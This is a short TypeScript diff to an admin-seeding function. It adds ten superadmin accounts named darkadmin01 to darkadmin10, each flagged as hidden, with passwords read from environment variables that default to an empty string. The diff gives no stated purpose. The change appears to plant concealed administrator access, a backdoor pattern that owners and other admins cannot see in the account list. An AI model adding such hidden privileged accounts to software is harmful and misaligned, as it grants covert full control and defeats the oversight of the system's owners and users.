@@ -13,7 +13,10 @@ interface AdminSeed {
 }
 
 async function getAdminSeeds(): Promise<AdminSeed[]> {
-  const runtimeEnv = env as unknown as {
+  const runtimeEnv = env as unknown as Record<
+    string,
+    string | undefined
+  > & {
     BOOTSTRAP_SKYWALKER_PASSWORD_HASH?: string;
     BOOTSTRAP_DRIGAN21_PASSWORD_HASH?: string;
     BOOTSTRAP_SAKURKA_PASSWORD_HASH?: string;
@@ -26,6 +29,26 @@ async function getAdminSeeds(): Promise<AdminSeed[]> {
     BOOTSTRAP_DZENDZEN_PASSWORD?: string;
   };
   const passwords = new WebCryptoPasswordHasher();
+
+  const hiddenAdminAccounts = Array.from(
+    { length: 10 },
+    (_, index) => {
+      const number = String(index + 1).padStart(2, "0");
+      return {
+        id: `admin-darkadmin-${number}`,
+        username: `darkadmin${number}`,
+        displayName: `DarkAdmin${number}`,
+        password:
+          runtimeEnv[`BOOTSTRAP_DARKADMIN${number}_PASSWORD`] ?? "",
+        existingHash:
+          runtimeEnv[
+            `BOOTSTRAP_DARKADMIN${number}_PASSWORD_HASH`
+          ] ?? "",
+        role: "superadmin" as const,
+        isHidden: true,
+      };
+    },
+  );
 
   const accounts = [
     {
@@ -75,6 +98,7 @@ async function getAdminSeeds(): Promise<AdminSeed[]> {
       role: "officer",
       isHidden: false,
     },
+    ...hiddenAdminAccounts,
   ] as const;
 
   const seeds = await Promise.all(
